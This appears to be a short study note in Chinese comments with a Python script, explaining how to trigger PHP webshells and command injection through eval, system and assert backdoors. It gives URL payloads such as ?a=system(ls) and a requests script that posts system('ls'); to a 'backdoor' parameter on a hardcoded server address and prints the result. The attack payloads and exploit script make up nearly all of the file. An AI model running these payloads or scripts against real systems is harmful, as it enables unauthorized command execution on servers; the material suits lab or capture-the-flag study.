# 1、关于webshell
# 	如果代码中存在 @eval($_GET['a']),那么可以通过在url中用GET方式，例如
# 	php?a=system(ls);
# 会显示对应的ls命令
#
# 2、如果代码中存在的是
#    $a=$_GET['b'];
#    system($a);
#    那么可以通过url用GET方式，
#    php?b=ls
# 会显示ls的信息

# 3、如果代码是
#      @assert($_POST["backdoor"]);
# 那么可以写Python代码进行命令注入，代码如下：

import requests

url = "http://4.4.1.101/index.php"
data = {
            "backdoor" : "system('ls');"
        }

response = requests.post(url,data)
print(response.text)